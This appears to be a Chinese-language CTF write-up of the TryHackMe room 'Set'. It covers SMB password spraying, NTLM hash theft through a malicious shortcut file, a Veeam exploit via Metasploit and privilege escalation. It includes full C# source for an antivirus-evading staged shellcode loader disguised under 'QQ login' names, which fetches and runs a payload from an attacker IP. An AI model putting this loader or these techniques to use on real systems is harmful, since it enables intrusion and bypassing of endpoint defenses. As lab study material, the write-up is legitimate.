# Set

您再次发现自己在Windcorp公司的内部网络上。上次你去那里的味道真好，你回来了 了解更多。

但是，这次他们设法保护了域控制器，因此您需要找到另一台服务器，并在第一次扫描时发现“Set”。

Set被用作开发人员的平台，最近遇到了一些问题。他们不得不重置很多用户并恢复备份（也许您不是他们网络上唯一的黑客？因此，他们决定确保所有用户都使用正确的密码并关闭一些松散的策略。 你还能找到进去的路吗？某些用户是否比其他用户更有特权？还是更草率的？也许您需要跳出框框思考一下，以规避他们的新安全控制......

---

## 端口扫描

循例nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/8f089f73fa4842fb8dfbe53848cffe59.png)

有两个子域，加进hosts

## Web枚举

进到set子域

![在这里插入图片描述](https://img-blog.csdnimg.cn/a03f89ea61dd477ebb2270333104476a.png)

在主页的源代码中的search.js发现了user.xml，里面记录了姓名、电话和邮箱

![在这里插入图片描述](https://img-blog.csdnimg.cn/91b2c78092f044fb95cfdfa00e897f61.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/1a5c50e4822f481e8fd2b49599f30231.png)

先把xml保存一下，可能会有用

gobuster扫一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/865a191a694042838f7ee641cfea8578.png)

## SMB枚举

appnotes.txt，这意味着可能会有账户的密码会比较薄弱

![在这里插入图片描述](https://img-blog.csdnimg.cn/fa0333f63b96400a80312a08f33038a5.png)

提取用户名

![在这里插入图片描述](https://img-blog.csdnimg.cn/a09d9d295f314de393846636078bc772.png)

使用[username-generator.py](https://github.com/shroudri/username_generator)生成可能的账户名

![在这里插入图片描述](https://img-blog.csdnimg.cn/c5bd979d610e4e9485871bb1ed05b78c.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/356e89ac99324f20ada028ac4376862e.png)

crackmapexec爆

![在这里插入图片描述](https://img-blog.csdnimg.cn/c48d2d7b258649c7996499db178dc448.png)

按这个速度爆下去，估计没个10天半个月都爆不完，我选择看一眼wp是哪个账户

![在这里插入图片描述](https://img-blog.csdnimg.cn/16729fb2ad72467a89b8d350b51b71e3.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/a4c7740350584b6ba52e75f6b2b7ed90.png)

smbmap看一眼

![在这里插入图片描述](https://img-blog.csdnimg.cn/a3062da1378147e698d7f2473e24759c.png)

用smbclient连接，获得info.txt

![在这里插入图片描述](https://img-blog.csdnimg.cn/2945e3d2e03446ab845140a98708173c.png)

flag1和一些信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/6b11a72f8daa4417b622c34434bd4d81.png)

## 立足 - SMB-NTLM回传

它会自动读取我们上传的zip文件，并查看里面的文件

我们都知道windows可以直接通过\\\\ip\\share来远程访问文件, 在thm中我们已经用过很多次了

如果它要是带着ntlm hash过来，那么我们将可以利用其凭据进行下一步操作

利用mslink创建链接文件，指向攻击机的smb share

![在这里插入图片描述](https://img-blog.csdnimg.cn/4f30096fc19c49648031b2c8f2e764f4.png)

压缩zip然后上传

responder开启监听，获得michellewat的hash

![在这里插入图片描述](https://img-blog.csdnimg.cn/a744decdfe734999841d4370cd43fb39.png)

hashcat直接爆

![在这里插入图片描述](https://img-blog.csdnimg.cn/4bccf8ef9a0b473991ad363096bb83e7.png)

看见开了5985端口，直接winrm登进来，同时拿到flag2

![在这里插入图片描述](https://img-blog.csdnimg.cn/5a5da4d089ca4f40bb3a53971e41f839.png)

## Veeam未授权RCE

netstat发现一个2805端口

![在这里插入图片描述](https://img-blog.csdnimg.cn/e79fcec9edc54ae4aded9246047b724a.png)

查看进程

![在这里插入图片描述](https://img-blog.csdnimg.cn/806eca74ca5943b5a915fbb4fde84e4d.png)

百度了解了下veeam，wmic、get-service、accesschk都用不了

直接暴力枚举

![在这里插入图片描述](https://img-blog.csdnimg.cn/c4c736289a1f40638a2f9a1431af43d5.png)

查看版本

![在这里插入图片描述](https://img-blog.csdnimg.cn/d01e4293e1da4cdb806b7701ec54d3be.png)

看一眼nvd

![在这里插入图片描述](https://img-blog.csdnimg.cn/937fbb0f02c34027b5ca83b50f788b9a.png)

该版本存在漏洞，现在应该要进行端口转发出来看看

2805端口虽然开在了0.0.0.0，但攻击机无法访问到，我也尝试了frp、chisel、ssh反向连接，应该是因为防火墙或是其他的缘故，连接不到攻击机

使用plink借助ssh来进行ssh反向连接并进行远程端口转发

![在这里插入图片描述](https://img-blog.csdnimg.cn/bfa488be587c4aa7a26d8b11dbbd228d.png)

攻击机查看，没问题

![在这里插入图片描述](https://img-blog.csdnimg.cn/8facefa7b702412cb4b2bc0dea4195c1.png)

msf有exp

![在这里插入图片描述](https://img-blog.csdnimg.cn/9fb0f80d0f4448cb89ea342aa4863107.png)

由于WinDefender的存在，我们无法直接使用msf进行getshell

并且还需要对msf的exp进行修改，使用windows/x64/exec执行命令，这样不会被WinDefender察觉

![在这里插入图片描述](https://img-blog.csdnimg.cn/3ced0fd4f1914dfaa8c88c0597da5c0d.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/3e1d2e6f196f4d4e8c93afd359ae29ed.png)

## 免杀 - Bypass WinDefender

**现在虽然能够成功执行命令，但这是一次绝佳的免杀练习机会**

首先我们选择做一个简单的分阶段的shellcode加载器，基于C#

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net;

class Program
{
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static void Main(string[] args)
    {
        LoginQQ();
    }

    public static void LoginQQ()
    {
        string qq_loginURI = "http://10.14.39.48:8000/login_qq_api";
        WebClient webClient = new WebClient();

        byte[] qqLoginState = webClient.DownloadData(qq_loginURI);

        UInt32 QQOpen = VirtualAlloc(0, (UInt32)qqLoginState.Length, 0x1000, 0x40);
        Marshal.Copy(qqLoginState, 0, (IntPtr)(QQOpen), qqLoginState.Length);

        IntPtr QQHandle = IntPtr.Zero;
        UInt32 QQthreadId = 0;
        IntPtr QQparameter = IntPtr.Zero;
        QQHandle = CreateThread(0, 0, QQOpen, QQparameter, 0, ref QQthreadId);

        WaitForSingleObject(QQHandle, 0xFFFFFFFF);
    }
}
```

我们考虑了熵, 它挺低的，至少满足了thm教程中所说的5.x、6.x

![在这里插入图片描述](https://img-blog.csdnimg.cn/7c371e2fdf8c40b4be70ef1193494d55.png)

简单的通过http获取shellcode并利用win32 api写入内存并执行

使用csc编译得到exe

上传到VirusTotal分析一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/3d0daca6a3bd4cf2bf5eabdebb4595f9.png)

我们编写的“QQ”很幸运，它绕过了大多数AV检测，**包括WinDefender**

这仅仅只使用了thm教导了一小部分知识，就这么轻松绕过了，或许是得益于分阶段优势的原因吧

![在这里插入图片描述](https://img-blog.csdnimg.cn/29549f8391ac48b3b15e4124b32e6b82.png)

## 免杀马测试

这么简单的免杀就到此为止，当然，我们并没有考虑运行时的内存检测，但让我们碰碰运气

生成shellcode

![在这里插入图片描述](https://img-blog.csdnimg.cn/ca1409069f8047a8acef2c745d6695b3.png)

python开启http服务，把steged loader传过去

直接运行loader

![在这里插入图片描述](https://img-blog.csdnimg.cn/4e353d8c71394c62a298afa79ff961ed.png)

loader会请求所谓的“login_qq_api”，其实这是我们的shellcode

![在这里插入图片描述](https://img-blog.csdnimg.cn/aceec9fb36af4aaaab5c854a7b4166ac.png)

nc监听的情况，**成功getshell，并且没有运行时的内存检测，我们的免杀成功**

![在这里插入图片描述](https://img-blog.csdnimg.cn/f43d2030fbe8421fa8c083731f6dd674.png)

## 权限提升 - 免杀马利用

回到房间正文，我们继续利用veeam的exp来通过我们的免杀马getshell

![在这里插入图片描述](https://img-blog.csdnimg.cn/c1fba14003b844d4b4df2c5239912081.png)

nc监听，成功过来one账户

![在这里插入图片描述](https://img-blog.csdnimg.cn/06eed38b8881460495c77afbcc61bc6b.png)

该账户已经在administrators组中，并且shell是高IL

![在这里插入图片描述](https://img-blog.csdnimg.cn/6bf2c203f1384ac38983129bd0caa736.png)

拿下最后的flag3

![在这里插入图片描述](https://img-blog.csdnimg.cn/a5b810b6226e4a7da40fb11c5ab2d50f.png)

## 结束

整个房间或许难点应该在于绕过WinDefender做免杀这，但我有thm教导的知识，很轻松就绕过了

值得纪念的一天，这也是我第一次将thm教导一的小部分的红队免杀知识交付于此

![在这里插入图片描述](https://img-blog.csdnimg.cn/4aa689104f854f1abb5e71b9f6401a05.png)
